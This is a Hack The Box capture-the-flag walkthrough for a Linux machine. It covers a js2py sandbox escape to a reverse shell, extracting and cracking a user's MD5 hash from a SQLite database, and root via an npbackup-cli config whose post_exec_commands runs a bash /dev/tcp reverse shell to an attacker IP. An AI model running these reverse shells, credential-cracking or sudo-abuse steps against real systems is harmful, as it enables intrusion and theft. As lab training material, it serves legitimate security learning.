# Hack The Box — CodePartTwo

Difficulty: Medium
OS: Linux
Attack Path: Web RCE → app → marco → root

## 1. Initial Enumeration
Port Scan
nmap -sC -sV -p- 10.10.11.82


Relevant Results

8000/tcp – Flask web application

## 2. Web Application Analysis (Port 8000)

Browsing http://10.10.11.82:8000 revealed a Flask application that allows users to execute JavaScript code via a /run_code endpoint.

Source code inspection revealed the use of js2py:

import js2py
js2py.disable_pyimport()


Despite attempted sandboxing, the js2py version in use is vulnerable to a sandbox escape.

## 3. Initial Foothold — js2py Sandbox Escape
Vulnerability

CVE-2024-28397 — js2py sandbox escape leading to RCE

Exploit Used

🔗 https://github.com/naclapor/CVE-2024-28397

Using the public PoC, arbitrary command execution was achieved through the /run_code endpoint, resulting in a reverse shell.

Listener (Attacker)

```
nc -lvnp 4444
```

Result
whoami
app

## 4. Shell Stabilization (User: app)

The initial reverse shell was unstable. It was upgraded to a full PTY using Python.

Spawn a PTY (Target)
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the Shell (Attacker Terminal)
CTRL+Z

Fix Terminal Settings (Attacker)
stty raw -echo
fg


Press Enter once.

Finalize Terminal (Target)
export TERM=xterm
stty rows 40 columns 120


The shell is now fully interactive and stable.

## 5. Privilege Escalation — app → marco
SQLite Credential Discovery

While enumerating the application directory, a SQLite database was discovered:

cd /home/app/app/instance
ls
users.db


Open the database:

sqlite3 users.db


List tables:

.tables


Extract credentials:

SELECT username, password_hash FROM user;


This revealed an MD5 password hash for the local user marco.

Password Hash Cracking (Hashcat)

The hash was copied to the attacker machine:

echo '<md5_hash>' > hash.txt


Cracked using Hashcat with the RockYou wordlist:

hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt


Using the recovered password, the user was switched:

su marco

## 6. Privilege Escalation — marco → root
Sudo Enumeration
sudo -l


Result

(ALL) NOPASSWD: /usr/local/bin/npbackup-cli


This indicates that marco can execute npbackup-cli as root without a password.

## 7. Root Exploitation — npbackup-cli Misconfiguration
Analysis

npbackup-cli is a backup utility that:

Runs as root via sudo

Loads user-supplied configuration files

Executes post_exec_commands as root

Does not sanitize command execution

Malicious Configuration File

Create a custom config file:

nano /tmp/npbackup.conf


Insert the following payload:
```
post_exec_commands: [bash -c 'bash -i >& /dev/tcp/10.10.16.168/4444 0>&1']
```
Listener (Attacker)
nc -lvnp 4444

Trigger Root Execution
sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf --backup --force


This forces execution of the backup and triggers the post-execution command.

## 8. Root Shell Stabilization

After receiving the root shell, it was stabilized using the same Python PTY technique.

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 columns 120


Verify access:

whoami
root

## 9. Root Flag
cat /root/root.txt

798c61dabd6a410ce2637c198e51f61

## 10. Attack Chain Summary
Web App (Port 8000)
  ↓
CVE-2024-28397 (js2py sandbox escape)
  ↓
Reverse shell as app
  ↓
Python PTY stabilization
  ↓
SQLite credential extraction
  ↓
MD5 hash cracked with Hashcat
  ↓
User marco
  ↓
sudo npbackup-cli
  ↓
post_exec_commands reverse shell
  ↓
root
